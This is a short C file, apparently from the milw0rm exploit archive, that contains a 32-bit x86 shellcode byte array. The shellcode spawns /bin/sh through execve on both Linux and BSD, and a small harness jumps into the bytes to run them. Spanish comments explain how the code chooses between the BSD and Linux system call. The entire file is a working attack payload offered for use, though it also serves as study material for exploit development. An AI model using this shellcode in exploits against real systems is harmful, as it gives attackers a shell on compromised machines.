/*
 *  Linux/x86 and Bsd/x86
 *
 *   execve() of /bin/sh by dymitri!!!
 *
 */



#include <stdio.h>
char
code[] =
        "\x31\xc0"
        "\x50"
        "\x68\x2f\x2f\x73\x68"
        "\x68\x2f\x62\x69\x6e"
        "\x89\xe3"
        "\x50"
        "\x54"
        "\x53"
        "\x50"
        "\x8c\xe0"
        "\x21\xc0"
        "\x74\x04"
        "\xb0\x3b"
        "\xeb\x07" /* si es bsd saltamos los 7 bytes para llegar al int $0x80 */
        "\xb0\x0b"
        "\x99"     /* En caso contrario si %fs es igual a 0 configuramos para que la ejecucion sea sobre linux */
        "\x52"
        "\x53"
        "\x89\xe1"
        "\xcd\x80";
main()
{
  void (*s)() = (void *)code;
  printf("Shellcode length: %d\nExecuting..\n\n",
      strlen(code));
  s();
}

// milw0rm.com [2004-09-12]